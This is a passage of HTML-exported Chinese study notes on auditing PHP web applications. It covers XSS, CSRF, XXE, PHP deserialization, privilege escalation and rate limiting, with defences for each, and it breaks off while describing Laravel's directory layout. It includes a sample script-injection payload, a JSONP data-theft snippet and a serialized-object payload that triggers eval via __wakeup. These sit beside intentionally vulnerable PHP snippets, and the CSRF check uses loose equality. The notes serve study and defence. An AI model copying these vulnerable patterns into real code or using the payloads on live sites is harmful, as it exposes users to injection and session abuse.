+<div class="outline-text-3" id="text-h:9b34ebd5-d2e8-46b4-8c94-2ea23227942d">
+<p>
+跨站脚本(攻击) 让用户浏览器执行到攻击者指定的JS脚本代码
+</p>
+</div>
+<div id="outline-container-h:d54c2e79-81af-4bc0-9bec-036b0e453224" class="outline-4">
+<h4 id="h:d54c2e79-81af-4bc0-9bec-036b0e453224"><a href="#h:d54c2e79-81af-4bc0-9bec-036b0e453224">安全分享</a></h4>
+<div class="outline-text-4" id="text-h:d54c2e79-81af-4bc0-9bec-036b0e453224">
+<p>
+工作中一般xss漏洞不怎么审，如果审计xss漏洞，由于现在基本都是前后端分离，很多前端做了过滤但后端不知道，所以导致审计误报会很高。一般审后端代码时不看看xss漏洞，审前端时会看。
+</p>
+
+<p>
+XSS
+</p>
+</div>
+</div>
+<div id="outline-container-h:ac3f2834-28fc-48da-9b09-cc527f45e3d3" class="outline-4">
+<h4 id="h:ac3f2834-28fc-48da-9b09-cc527f45e3d3"><a href="#h:ac3f2834-28fc-48da-9b09-cc527f45e3d3">反射型XSS</a></h4>
+<div class="outline-text-4" id="text-h:ac3f2834-28fc-48da-9b09-cc527f45e3d3">
+<p>
+反射型XSS是服务器后端处理时把处理不当的用户输入输出到网页 导致用户浏览器执行恶意代码
+</p>
+<div class="org-src-container">
+<pre class="src src-php">&lt;?php
+echo 'Hello '.$_GET['name'].'!';
+</pre>
+</div>
+
+<p>
+在控制器活模板中直接echo
+</p>
+
+<p>
+正常输入: ?name=xxx 服务器返回 Hello xxx!
+</p>
+
+<p>
+浏览器渲染纯文本 Hello xxx!
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">&#25915;&#20987;&#32773;&#36755;&#20837;:
+?<span class="org-variable-name">name</span>=&lt;script <span class="org-variable-name">type</span>=<span class="org-string">"text/javascript"</span>&gt;alert(<span class="org-string">'XSS!'</span>);&lt;/script&gt;
+
+&#26381;&#21153;&#22120;&#36820;&#22238;
+Hello &lt;script <span class="org-variable-name">type</span>=<span class="org-string">"text/javascript"</span>&gt;alert(<span class="org-string">'XSS!'</span>);&lt;/script&gt;!
+
+&#27983;&#35272;&#22120;&#28210;&#26579; Hello ! script&#34987;&#20316;&#20026;html&#26631;&#31614;&#35299;&#26512;&#65292;&#25191;&#34892;&#20854;&#20013;&#30340;&#20195;&#30721;&#65292;&#24377;&#20986;&#35686;&#21578;&#26694;XSS!
+</pre>
+</div>
+
+<p>
+此种漏洞比较明显 很容易分析问题的存在审计时注意 PHP常使用 htmlspecialchars 和 htmlentities函数 转义用户的输入作为防护
+</p>
+
+<p>
+非前后端分离框架审计时，可以关注templet、view等含有视图关键字的目录
+</p>
+
+<p>
+可以搜索所有php 输出功能的函数
+</p>
+</div>
+</div>
+<div id="outline-container-h:47e9e743-84ef-4aa9-99e8-587b9db97965" class="outline-4">
+<h4 id="h:47e9e743-84ef-4aa9-99e8-587b9db97965"><a href="#h:47e9e743-84ef-4aa9-99e8-587b9db97965">php输出函数</a></h4>
+<div class="outline-text-4" id="text-h:47e9e743-84ef-4aa9-99e8-587b9db97965">
+<table>
+
+
+<colgroup>
+<col  class="org-left">
+
+<col  class="org-left">
+</colgroup>
+<thead>
+<tr>
+<th scope="col" class="org-left">函数名</th>
+<th scope="col" class="org-left">功能描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td class="org-left">echo()</td>
+<td class="org-left">输出字符串</td>
+</tr>
+
+<tr>
+<td class="org-left">print()</td>
+<td class="org-left">输出一个或多个字符串</td>
+</tr>
+
+<tr>
+<td class="org-left">print_r()</td>
+<td class="org-left">打印关于变量的易于理解的信息</td>
+</tr>
+
+<tr>
+<td class="org-left">printf()</td>
+<td class="org-left">输出格式化字符串</td>
+</tr>
+
+<tr>
+<td class="org-left">sprintf()</td>
+<td class="org-left">把格式化的字符串写入一个变量中</td>
+</tr>
+
+<tr>
+<td class="org-left">var_dump()</td>
+<td class="org-left">输出变量的内容、类型或字符串的内容、类型、长度</td>
+</tr>
+
+<tr>
+<td class="org-left">die()</td>
+<td class="org-left">输出一条消息，并退出当前脚本</td>
+</tr>
+</tbody>
+</table>
+
+<p>
+查看输出函数是否将用户输入直接输出到前端页面当中
+</p>
+</div>
+</div>
+<div id="outline-container-h:7cc3a036-d4a1-4d93-a262-234d3c6e6805" class="outline-4">
+<h4 id="h:7cc3a036-d4a1-4d93-a262-234d3c6e6805"><a href="#h:7cc3a036-d4a1-4d93-a262-234d3c6e6805">储存型XSS</a></h4>
+<div class="outline-text-4" id="text-h:7cc3a036-d4a1-4d93-a262-234d3c6e6805">
+<p>
+将服务器储存的处理不当的用户输入输出到网页 导致用户浏览器执行恶意代码
+</p>
+<ul class="org-ul">
+<li>攻击者输入-&gt;服务器储存 攻击者得到一个返回储存值的页面</li>
+<li>被害者请求页面-&gt;服务器调用储存并输出-&gt;XSS 常见于评论 留言 文章 等</li>
+</ul>
+
+<p>
+比如:
+</p>
+<ul class="org-ul">
+<li>发布评论 攻击者发布带有恶意代码的评论 被害者访问评论展示页面 触发XSS 后台管理员审核评论时 触发XSS</li>
+<li>用户系统设置昵称时 攻击者将昵称写入数据库 在评论显示时读取数据库值输出用户昵称</li>
+</ul>
+
+<p>
+前端外部文件引用
+</p>
+
+<p>
+攻击者修改前端引用的文件链接 引用外部网站文件常见于 <b>用户头像 文章/评论图片/弹幕</b> 等
+</p>
+
+<p>
+被害者访问到攻击者个人页面 <b>文章 评论 聊天内容时会访问远程图片文件</b>
+</p>
+
+<ul class="org-ul">
+<li>这可能会使攻击者获取到访问者的ip 浏览器 系统等信息</li>
+<li>也可以绕过内容审查 在审查通过后动态替换文件内容(hsbc广告等信息)
+<ul class="org-ul">
+<li>解决方法:正则匹配限制url域名</li>
+</ul></li>
+</ul>
+</div>
+<div id="outline-container-h:54f2acfe-67f6-4b07-aaea-6d74c42cdb39" class="outline-5">
+<h5 id="h:54f2acfe-67f6-4b07-aaea-6d74c42cdb39"><a href="#h:54f2acfe-67f6-4b07-aaea-6d74c42cdb39">防护</a></h5>
+<div class="outline-text-5" id="text-h:54f2acfe-67f6-4b07-aaea-6d74c42cdb39">
+<p>
+后端过滤
+</p>
+<ul class="org-ul">
+<li>服务端返回HTTP头 添加内容安全策略 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy">content-security-policy</a> 头</li>
+<li>正确设置安全策略可以有效减少未知XSS/html外部文件引用漏洞产生的危害</li>
+<li>COOKIES添加Httponly属性 防止使用js读取用户cookies (js发起表单仍可携带cookies)</li>
+<li><b>htmlspecialchars()将特殊字符转换为 HTML 实体，注意默认不转义单引号，需设置ENT_QUOTES常量</b></li>
+</ul>
+</div>
+</div>
+</div>
+<div id="outline-container-h:a33faad4-5f9d-4677-972c-6eb69d78c352" class="outline-4">
+<h4 id="h:a33faad4-5f9d-4677-972c-6eb69d78c352"><a href="#h:a33faad4-5f9d-4677-972c-6eb69d78c352">PHP设置csp</a></h4>
+<div class="outline-text-4" id="text-h:a33faad4-5f9d-4677-972c-6eb69d78c352">
+<p>
+可以使用 <code>PHP header()</code> 方法设置
+</p>
+<div class="org-src-container">
+<pre class="src src-php">&lt;?php
+header("Content-Security-Policy: default-src 'self'");
+?&gt;
+</pre>
+</div>
+
+<p>
+<a href="https://content-security-policy.com/">CSP安全策略参考手册</a>
+</p>
+</div>
+</div>
+</div>
+<div id="outline-container-h:255edf61-b606-4d2a-b81b-b58fdfba94b9" class="outline-3">
+<h3 id="h:255edf61-b606-4d2a-b81b-b58fdfba94b9"><a href="#h:255edf61-b606-4d2a-b81b-b58fdfba94b9">CSRF</a></h3>
+<div class="outline-text-3" id="text-h:255edf61-b606-4d2a-b81b-b58fdfba94b9">
+<p>
+跨站请求伪造
+CSRF
+</p>
+</div>
+<div id="outline-container-h:3e30d509-5a44-49d4-9efe-6c7fbf86f6b4" class="outline-4">
+<h4 id="h:3e30d509-5a44-49d4-9efe-6c7fbf86f6b4"><a href="#h:3e30d509-5a44-49d4-9efe-6c7fbf86f6b4">安全分享</a></h4>
+<div class="outline-text-4" id="text-h:3e30d509-5a44-49d4-9efe-6c7fbf86f6b4">
+<p>
+如何审计CSRF?
+</p>
+<ul class="org-ul">
+<li>功能是否敏感
+<ul class="org-ul">
+<li>审计成本高些，需要判断代码逻辑是否是敏感操作</li>
+</ul></li>
+</ul>
+
+<p>
+防御：
+</p>
+<ul class="org-ul">
+<li>请求地址中加token验证</li>
+<li>加http refer字段验证</li>
+<li>加验证码。短信验证码、图片验证码</li>
+</ul>
+
+<p>
+解决审计成本高问题，需要接csrf网关，前端自动有token验证。研发人员就不需要做修改，安全人员只需要看有没有接网关。
+</p>
+</div>
+</div>
+<div id="outline-container-h:987f99f3-ac90-42e8-81f6-937cee56f96c" class="outline-4">
+<h4 id="h:987f99f3-ac90-42e8-81f6-937cee56f96c"><a href="#h:987f99f3-ac90-42e8-81f6-937cee56f96c">表单请求</a></h4>
+<div class="outline-text-4" id="text-h:987f99f3-ac90-42e8-81f6-937cee56f96c">
+<p>
+攻击者使被害者的浏览器在用户不知情的情况下发起目标网站表单请求 这些表单常常带有目标网站的用户cookies可以以用户在目标网站的身份进行操作 (攻击者不能获取cookies)
+</p>
+
+<p>
+检查鉴权后的操作是否添加token/Referrer校验 拒绝空Referrer
+</p>
+
+<p>
+JSONP请求
+</p>
+<ul class="org-ul">
+<li>除了表单常见的还有jsonp请求</li>
+<li>服务器返回一段带有函数调用的json，浏览器把jsonp页面当做js加载执行调用回调函数将数据传入函数</li>
+<li>用于浏览器从服务器动态获取信息，由于js等静态资源调用浏览器默认放行,造成了风险</li>
+<li>可获取用户登陆后才能获取的信息 ，比如登陆用户个人资料、账户余额 等</li>
+</ul>
+
+
+<div class="org-src-container">
+<pre class="src src-js">&lt;script&gt;
+<span class="org-keyword">function</span> <span class="org-function-name">callbackfun5</span>(<span class="org-variable-name">json</span>){
+alert(JSON.stringify(json))
+}
+&lt;/script&gt;
+&lt;script src=<span class="org-string">"http://xoox.com/order/confirm_order_promise?callback=callbaackfun5"</span>&gt;&lt;/script&gt;
+</pre>
+</div>
+
+
+<p>
+jsonp可以绕过跨域策略限制
+</p>
+<ul class="org-ul">
+<li>jsonp原理： <a href="https://www.bilibili.com/video/BV1jt411j72F/?p=5">https://www.bilibili.com/video/BV1jt411j72F/?p=5</a></li>
+</ul>
+</div>
+</div>
+<div id="outline-container-h:232c0a54-c765-4e0c-8cd3-b8ca1010b8cb" class="outline-4">
+<h4 id="h:232c0a54-c765-4e0c-8cd3-b8ca1010b8cb"><a href="#h:232c0a54-c765-4e0c-8cd3-b8ca1010b8cb">防护方法</a></h4>
+<div class="outline-text-4" id="text-h:232c0a54-c765-4e0c-8cd3-b8ca1010b8cb">
+<ul class="org-ul">
+<li>添加随机token 在表单/jsonp请求时附加token(非常有效)</li>
+<li>服务端检测 Referrer (一定要拒绝空Referrer html表单可以发起空referrer)(表单/静态资源引用/jsonp 请求)</li>
+<li>如果使用正则匹配一定要检查正则是否可以被绕过</li>
+<li>服务器返回Access-Control-Allow-Origin 头 (表单/静态资源引用/jsonp请求无效 仅AJAX请求)(一定不要设置成 *)</li>
+</ul>
+
+<div class="org-src-container">
+<pre class="src src-sh">1.&#21551;&#21160;&#20250;&#35805;&#24182;&#29983;&#25104;&#19968;&#20010;&#38543;&#26426;&#20196;&#29260;&#12290;
+<span class="org-function-name">session_start</span>();
+$<span class="org-variable-name">_SESSION</span>[<span class="org-string">"token"</span>] = bin2hex(random_bytes(32));
+
+2.&#23558; CSRF &#20196;&#29260;&#23884;&#20837;&#21040; HTML &#34920;&#21333;&#20013;&#12290;
+&lt;input <span class="org-variable-name">type</span>=<span class="org-string">"hidden"</span> <span class="org-variable-name">name</span>=<span class="org-string">"token"</span> <span class="org-variable-name">value</span>=<span class="org-string">"&lt;?=$_SESSION["</span>token<span class="org-string">"]?&gt;"</span>/&gt;
+
+3.&#25552;&#20132;&#34920;&#21333;&#21518;&#65292;&#23558;&#25552;&#20132;&#30340;&#20196;&#29260;&#19982;&#20250;&#35805;&#36827;&#34892;&#20132;&#21449;&#26816;&#26597;&#12290;
+<span class="org-keyword">if</span> (<span class="org-negation-char">!</span>isset($<span class="org-variable-name">_POST</span>[<span class="org-string">"token"</span>]) || <span class="org-negation-char">!</span>isset($<span class="org-variable-name">_SESSION</span>[<span class="org-string">"token"</span>])) {
+  <span class="org-keyword">exit</span>();
+}
+<span class="org-keyword">if</span> ($<span class="org-variable-name">_POST</span>[<span class="org-string">"token"</span>] == $<span class="org-variable-name">_SESSION</span>[<span class="org-string">"token"</span>]) {
+  DO PROCESSING
+}
+</pre>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-h:56e88d34-b6de-41ee-bdcd-d49ed6842ac5" class="outline-3">
+<h3 id="h:56e88d34-b6de-41ee-bdcd-d49ed6842ac5"><a href="#h:56e88d34-b6de-41ee-bdcd-d49ed6842ac5">XXE</a></h3>
+<div class="outline-text-3" id="text-h:56e88d34-b6de-41ee-bdcd-d49ed6842ac5">
+<p>
+XML外部实体(注入) 攻击者利用xml的性质可以获取本地/远程文件内容 (不同于其他语言 PHP 中xml实体可以使用PHP伪协议)
+</p>
+
+<p>
+XXE
+XML外部实体是XML的一个特性 XML可以使用外部实体引用来包含和解析其他文档当然XML还有其他实体 详细内容可以参考<a href="https://www.yiibai.com/dtd/dtd_entities.html">这个DTD教程</a>
+</p>
+
+<p>
+这里就不详细将利用技巧了
+</p>
+
+<p>
+审计时如果发现使用了文末列表的函数 就要检查是否禁用了外部实体
+</p>
+
+<div class="org-src-container">
+<pre class="src src-php">libxml_disable_entity_loader(true); //禁用外部实体使用到的函数 参数为true时禁用
+</pre>
+</div>
+
+<p>
+注意: php环境中libxml 版本&gt;=2.9.0时外部实体默认禁用
+</p>
+
+<p>
+漏洞常见处:
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">&#20989;&#25968; &#25551;&#36848;
+DOMDocument:: loadXML &#21152;&#36733;&#35299;&#26512;XML
+&lt;?php$<span class="org-variable-name">xml</span>=file_get_contents(<span class="org-string">'php://input'</span>);
+$<span class="org-variable-name">dom</span>=new DOMDocument();
+$<span class="org-variable-name">dom</span>-&gt;loadXML($<span class="org-variable-name">xml</span>);
+$<span class="org-variable-name">xml</span>=simplexml_import_dom($<span class="org-variable-name">dom</span>);
+$<span class="org-variable-name">xxe</span>=$<span class="org-variable-name">xml</span>-&gt;xxe; 
+<span class="org-builtin">echo</span> $<span class="org-variable-name">xxe</span>; ?&gt;
+
+simplexml_load_string &#21152;&#36733;&#35299;&#26512;XML&#23383;&#31526;&#20018;
+$<span class="org-variable-name">xml</span>=simplexml_load_string($<span class="org-variable-name">_REQUEST</span>[<span class="org-string">'xml'</span>]);
+<span class="org-function-name">print_r</span>($<span class="org-variable-name">xml</span>);
+
+simplexml_load_file &#35835;&#21462;&#25991;&#20214;&#20316;&#20026;XML&#25991;&#26723;&#35299;&#26512;
+<span class="org-function-name">simplexml_load_file</span>(<span class="org-string">"1.xml"</span>)
+</pre>
+</div>
+
+<p>
+Xml parser
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">&lt;?php
+$<span class="org-variable-name">simple</span> = <span class="org-string">"simple note"</span>;
+$<span class="org-variable-name">p</span> = xml_parser_create();
+<span class="org-function-name">xml_parse_into_struct</span>($<span class="org-variable-name">p</span>, $<span class="org-variable-name">simple</span>, $<span class="org-variable-name">vals</span>, $<span class="org-variable-name">index</span>);
+<span class="org-function-name">xml_parser_free</span>($<span class="org-variable-name">p</span>);
+<span class="org-builtin">echo</span> <span class="org-string">"Index array\n"</span>;
+<span class="org-function-name">print_r</span>($<span class="org-variable-name">index</span>);
+<span class="org-builtin">echo</span> <span class="org-string">"\nVals array\n"</span>;
+<span class="org-function-name">print_r</span>($<span class="org-variable-name">vals</span>);
+</pre>
+</div>
+
+<p>
+如果要防止php中的xxe漏洞，可以在simplexml_load_string前加上一句
+</p>
+<div class="org-src-container">
+<pre class="src src-sh"><span class="org-function-name">libxml_disable_entity_loader</span>(<span class="org-builtin">true</span>);&#31105;&#27490;&#20174;&#22806;&#37096;&#21152;&#36733;XML&#23454;&#20307;
+</pre>
+</div>
+
+<p>
+libxml_disable_entity_loader - 禁用加载外部实体的功能
+</p>
+
+<p>
+<b>描述</b>
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">bool libxml_disable_entity_loader ([ bool $<span class="org-variable-name">disable</span> = true ] )
+</pre>
+</div>
+
+<p>
+禁用/启用加载外部实体的功能。
+</p>
+
+<p>
+<b>参数</b>
+</p>
+
+<p>
+disable
+</p>
+
+<p>
+禁用（ TRUE ）或启用（ FALSE ）libxml扩展（如<a href="https://www.php.net/manual/en/book.dom.php">DOM</a>，<a href="https://www.php.net/manual/en/book.xmlwriter.php">XMLWriter</a>和<a href="https://www.php.net/manual/en/book.xmlreader.php">XMLReader</a>）来加载外部实体。
+</p>
+</div>
+</div>
+<div id="outline-container-反序列化" class="outline-3">
+<h3 id="反序列化"><a href="#反序列化">反序列化</a></h3>
+<div class="outline-text-3" id="text-反序列化">
+</div>
+<div id="outline-container-h:63e191b7-1f6d-46e9-b50a-9bc7256954af" class="outline-4">
+<h4 id="h:63e191b7-1f6d-46e9-b50a-9bc7256954af"><a href="#h:63e191b7-1f6d-46e9-b50a-9bc7256954af">序列化</a></h4>
+<div class="outline-text-4" id="text-h:63e191b7-1f6d-46e9-b50a-9bc7256954af">
+<p>
+函数: serialize
+</p>
+
+<p>
+将PHP中的值转化为一个字符串，有利于存储或传递 PHP 的值 同时不丢失其类型和结构如果被序列化的值是一个对象
+</p>
+</div>
+</div>
+<div id="outline-container-h:a167b31f-bb54-4f9d-b72b-5615b14110ff" class="outline-4">
+<h4 id="h:a167b31f-bb54-4f9d-b72b-5615b14110ff"><a href="#h:a167b31f-bb54-4f9d-b72b-5615b14110ff">反序列化</a></h4>
+<div class="outline-text-4" id="text-h:a167b31f-bb54-4f9d-b72b-5615b14110ff">
+<p>
+函数:unserialize
+</p>
+
+<ul class="org-ul">
+<li>__construct() 当一个对象创建时被调用</li>
+<li>__destruct() 当一个对象销毁前被调用</li>
+<li>__sleep() 在对象被序列化前被调用</li>
+<li>__wakeup 将在反序列化之后立即被调用</li>
+</ul>
+
+<p>
+反序列化在序列化操作后产生的字符串 还原序列化前的值
+如果被反序列化的结果包含对象 则会调用对应对象的__wakeup 魔法函数
+如果反序列化的字符串被用户可控 攻击者则有可能利用PHP中现有的对象调用对应魔法函数进行攻击(主要看对象定义的魔法函数所拥有的功能)
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">&lt;?php
+class xxx2
+{
+  var $<span class="org-variable-name">id</span> = <span class="org-string">'1'</span>;
+  <span class="org-keyword">function</span> <span class="org-function-name">__wakeup</span>()
+  {
+    <span class="org-builtin">eval</span>($<span class="org-variable-name">this</span>-&gt;id);
+  }
+}
+
+// &#24207;&#21015;&#21270;
+$<span class="org-variable-name">xxx1</span> = new xxx2();
+<span class="org-function-name">print_r</span>(serialize($<span class="org-variable-name">xxx1</span>)); // serialize &#24207;&#21015;&#21270;&#20989;&#25968;&#65292;&#25226;&#23545;&#35937;&#36716;&#21270;&#20026;&#23383;&#31526;&#20018;&#12290;&#23383;&#31526;&#20018;&#20869;&#23481; O:4:<span class="org-string">"xxx2"</span>:1:{s:2:<span class="org-string">"id"</span>;s:1:<span class="org-string">"1"</span>;}
+// O&#34920;&#31034;&#36825;&#26159;&#20010;&#23545;&#35937;&#65292;4&#34920;&#31034;&#31867;&#21517;&#26377;4&#20010;&#23383;&#31526;&#65292;xxx2&#34920;&#31034;&#31867;&#21517;&#65292;1&#34920;&#31034;&#26377;1&#20010;&#25104;&#21592;&#21464;&#37327;&#65292;&#25104;&#21592;&#21464;&#37327;&#21517;&#20026;id&#26377;2&#20010;&#23383;&#31526;&#65292;s&#34920;&#31034;string&#31867;&#22411;&#65292;&#25104;&#21592;&#30340;&#20540;&#20026;1&#12290;
+
+// &#21453;&#24207;&#21015;&#21270;
+// id &#23545;&#24212;&#30340;&#20540;&#25913;&#20026; phpinfo(); &#21453;&#24207;&#21015;&#21270;&#20250;&#35843;&#29992;__wakeup&#20989;&#25968;&#65292;&#20989;&#25968;&#20869;&#23481;&#26159;&#21033;&#29992;eval&#35299;&#26512;&#25191;&#34892;id&#23545;&#24212;&#30340;&#20540;
+$<span class="org-variable-name">s</span> = <span class="org-string">'O:4:"xxx2":1:{s:2:"id";s:10:"phpinfo();";}'</span>;
+$<span class="org-variable-name">s_unserialize</span> = unserialize($<span class="org-variable-name">s</span>);
+<span class="org-function-name">print_r</span>($<span class="org-variable-name">s_unserialize</span>);
+<span class="org-builtin">echo</span> <span class="org-string">"&lt;/br&gt;"</span>;
+</pre>
+</div>
+
+<p>
+视频参考： <a href="https://www.bilibili.com/video/BV1p4411L7PM/">https://www.bilibili.com/video/BV1p4411L7PM/</a>
+</p>
+
+<p>
+防御：
+</p>
+<ul class="org-ul">
+<li>过滤反序列化内容
+<ul class="org-ul">
+<li>全局搜索wakeup，查看是否有接受反序列化路由参数</li>
+</ul></li>
+<li>找调用链，内建函数带wakeup方法的，看能不能触发</li>
+</ul>
+</div>
+</div>
+</div>
+<div id="outline-container-h:278f8ca6-cd6f-41ce-ae0a-6d3a479390a4" class="outline-3">
+<h3 id="h:278f8ca6-cd6f-41ce-ae0a-6d3a479390a4"><a href="#h:278f8ca6-cd6f-41ce-ae0a-6d3a479390a4">其他漏洞</a></h3>
+<div class="outline-text-3" id="text-h:278f8ca6-cd6f-41ce-ae0a-6d3a479390a4">
+<p>
+逻辑漏洞
+</p>
+<ul class="org-ul">
+<li>业务相关漏洞是非常灵活的一类漏洞</li>
+<li>多挖一些互联网公司SRC的业务漏洞，在挖掘达到一定数量后，会对业务漏洞会有更深的理解</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-h:0d20343f-2f69-41f0-ba70-f7b6d5f94938" class="outline-3">
+<h3 id="h:0d20343f-2f69-41f0-ba70-f7b6d5f94938"><a href="#h:0d20343f-2f69-41f0-ba70-f7b6d5f94938">越权漏洞</a></h3>
+<div class="outline-text-3" id="text-h:0d20343f-2f69-41f0-ba70-f7b6d5f94938">
+<p>
+越权是指用户可以进行超出业务设计上的权限限制的访问.
+</p>
+
+<ul class="org-ul">
+<li><p>
+操作平行越权: 访问/操作与当前用户同等权限的其他用户的数据
+</p>
+
+<p>
+例: 普通用户A可以删除普通用户B投稿的文章，从业务逻辑设计上用户A只能删除自己创建的稿件，但是在后端未做相应的限制
+</p></li>
+
+<li><p>
+垂直越权: 访问/操作与当前用户未拥有权限的数据
+</p>
+
+<p>
+例:日志审计管理员，设计上可以审计服务器日志，但不能进行其他操作，系统管理员可以进行系统配置、管理账号等操作
+</p>
+
+<p>
+如果使用日志审计管理员账号可以进行系统管理员的系统配置操作 这就是一个垂直越权越权漏洞非常灵活 具体细节要结合业务功能进行判断是否存在问题
+</p></li>
+</ul>
+
+<p>
+<b>未授权访问/无鉴权/鉴权绕过</b>
+</p>
+
+<p>
+访问/操作业务前未进行权限检查 或权限检查不严易被绕过
+</p>
+
+<p>
+比如上文的越权漏洞
+</p>
+
+<p>
+如果用户未进行登陆操作仍然可以访问后台页面获取数据/进行后台操作，这就是未授权访问(未授权访问&gt;垂直越权)
+</p>
+
+<p>
+有些后台操作为了方便添加后门，采用了弱校验(硬编码token、从head获取的UA和IP地址、弱JWT秘钥等) 这就可能造成鉴权绕过
+</p>
+
+<p>
+<b>频率限制</b>
+</p>
+
+<p>
+在一些关键业务点应做频率限制
+</p>
+
+<p>
+例如 用户登陆 使用ip/用户名限制单位时间内登陆次数 必要时增加多次失败锁定限制 (可以用例如memcache redis等缓存机制 记录次数 限制频率)配合验证码进行限制。防止账号密码爆破
+</p>
+
+<p>
+用户回复、发表文章、订阅关注功能 发起订单 等，也应增加频率和次数限制，防止大量填充垃圾信息，频率过高时增加验证码校验
+</p>
+
+<p>
+邮箱/短信验证码、加上单日次数及频率限制，必要时增加验证码校验
+</p>
+</div>
+<div id="outline-container-h:4180443e-2440-416a-856f-d38d79c96095" class="outline-4">
+<h4 id="h:4180443e-2440-416a-856f-d38d79c96095"><a href="#h:4180443e-2440-416a-856f-d38d79c96095">安全分享</a></h4>
+<div class="outline-text-4" id="text-h:4180443e-2440-416a-856f-d38d79c96095">
+<p>
+代码审计是否容易审计越权漏洞？
+</p>
+<ul class="org-ul">
+<li>水平越权，正常来说查看有没有权限校验是比较容易的，它是有明确的代码的。难的是要不要做权限判断，因为看代码时不知道业务逻辑，需要和研发了解业务逻辑。</li>
+</ul>
+
+<p>
+防御
+</p>
+<ul class="org-ul">
+<li>验证码，用户体验</li>
+<li>失败次数，锁定账号</li>
+<li>IP频率限制</li>
+</ul>
+</div>
+</div>
+</div>
+<div id="outline-container-h:93f25464-e5e4-4c81-9648-77258981f9dd" class="outline-3">
+<h3 id="h:93f25464-e5e4-4c81-9648-77258981f9dd"><a href="#h:93f25464-e5e4-4c81-9648-77258981f9dd">拒绝服务</a></h3>
+<div class="outline-text-3" id="text-h:93f25464-e5e4-4c81-9648-77258981f9dd">
+<ul class="org-ul">
+<li>通过特殊的用户输入，消耗的服务器资源。比如生成图片不限宽高(二维码 验证码 图片处理)</li>
+<li>URL跳转，跳转到网站外第三方链接，可用于钓鱼，如果存在head注入则可以构成xss</li>
+</ul>
+</div>
+</div>
+</section>
+<section id="outline-container-h:d2b5d6df-e835-47a5-a5ec-d8f37572ab8f" class="outline-2">
+<h2 id="h:d2b5d6df-e835-47a5-a5ec-d8f37572ab8f"><a href="#h:d2b5d6df-e835-47a5-a5ec-d8f37572ab8f">PHP 框架-Laravel</a></h2>
+<div class="outline-text-2" id="text-h:d2b5d6df-e835-47a5-a5ec-d8f37572ab8f">
+</div>
+<div id="outline-container-h:bde611ec-55e2-4dfa-a451-714231ab3fdc" class="outline-3">
+<h3 id="h:bde611ec-55e2-4dfa-a451-714231ab3fdc"><a href="#h:bde611ec-55e2-4dfa-a451-714231ab3fdc">介绍</a></h3>
+<div class="outline-text-3" id="text-h:bde611ec-55e2-4dfa-a451-714231ab3fdc">
+<p>
+<a href="https://laravel.p2hp.com/cndocs/9.x/structure#introduction">https://laravel.p2hp.com/cndocs/9.x/structure#introduction</a>
+</p>
+
+<p>
+默认的 Laravel 应用程序结构旨在为大型和小型应用程序提供一个很好的起点。 但是您可以随意组织您的应用程序。 Laravel 对任何给定类的位置几乎没有任何限制——只要 Composer 可以自动加载该类。
+</p>
+</div>
+</div>
+<div id="outline-container-h:ef94d822-56d5-4dae-a819-0af09b994b71" class="outline-3">
+<h3 id="h:ef94d822-56d5-4dae-a819-0af09b994b71"><a href="#h:ef94d822-56d5-4dae-a819-0af09b994b71">根目录</a></h3>
+<div class="outline-text-3" id="text-h:ef94d822-56d5-4dae-a819-0af09b994b71">
+<p>
+<a href="https://laravel.p2hp.com/cndocs/9.x/structure#the-root-directory">https://laravel.p2hp.com/cndocs/9.x/structure#the-root-directory</a>
+</p>
+
+<ul class="org-ul">
+<li>App 目录: app 目录包含应用程序的核心代码。 我们将很快更详细地探索这个目录； 但是，您应用程序中的几乎所有类都将在此目录中。</li>
+
+<li>Bootstrap 目录: bootstrap 目录包含启动框架的 app.php 文件。 该目录还包含一个“缓存”目录，其中包含用于性能优化的框架生成文件，例如路由和服务缓存文件。 您通常不需要修改此目录中的任何文件。</li>
+
+<li>Config 目录: 顾名思义， config 目录包含应用程序的所有配置文件。最好把这些文件都浏览一遍，并熟悉所有可用的选项。</li>
+
+<li>Database 目录: database 目录包含数据库迁移，模型工⼚和种子生成器文件。如果你愿意，你还可以把它作为 SQLite 数据库存放目录。</li>
+
+<li>Lang 目录: lang 目录包含应用程序的所有语言文件。</li>
+
+<li>Public 目录: public 目录包含 index.php 文件，该文件是进入你应用程序的所有请求的入口，并配置自动加载。该目录还包含你的资源，如图像、JavaScript 脚本和 CSS 样式。</li>
+
+<li>Resources 目录: resources 目录包含了 views 以及未编译的资源文件（如 CSS 或 JavaScript）。此目录还包含所有的语言文件。</li>
+
+<li>Routes 目录: routes 目录包含应用程序的所有路由定义。默认情况下，Laravel 包含几个路由文件：web.php ， api.php ， console.php 以及 channels.php .
+<ul class="org-ul">
+<li>web.php 文件包含 RouteServiceProvider 放置在 web 中间件组中的路由，该中间件组提供会话状态，CSRF保护和 cookie 加密，如果你的应用程序不提供无状态的 RESTful API，那么你的所有路由都很可能在 web.php 文件。</li>
+<li>api.php 文件包含 RouteServiceProvider 放置在 api 中间件组中的路由。 这些路由旨在是无状态的，因此通过这些路由进入应用程序的请求旨在[通过令牌]（/cndocs/9.x/sanctum）进行身份验证，并且无法访问会话状态。</li>
+<li>console.php 文件是您可以定义所有基于闭包的控制台命令的地方。 每个闭包都绑定到一个命令实例，允许一种简单的方法与每个命令的 IO 方法进行交互。 即使此文件没有定义 HTTP 路由，它也会定义应用程序中基于控制台的入口点（路由）。</li>
+<li>channels.php 文件是您可以注册应用程序支持的所有 <a href="https://laravel.p2hp.com/cndocs/9.x/broadcasting">事件广播</a> 频道的地方。</li>
+</ul></li>
+
+<li><p>
+Storage 目录: storage 目录包含你的日志、编译的 Blade 模板、基于文件的会话、文件缓存和框架生成的其他文件。 该目录分为“app”、“framework”和“logs”目录。 app 目录可用于存储应用程序生成的任何文件。 framework 目录用于存储框架生成的文件和缓存。 最后， logs 目录包含应用程序的日志文件。
+</p>
+
+<p>
+storage/app/public 目录可用于存储用户生成的文件，例如个人资料头像，这些文件应该可以公开访问。 你应该在 public/storage 创建一个指向这个目录的符号链接。 您可以使用 php artisan storage:link Artisan命令创建链接。
+</p></li>
+
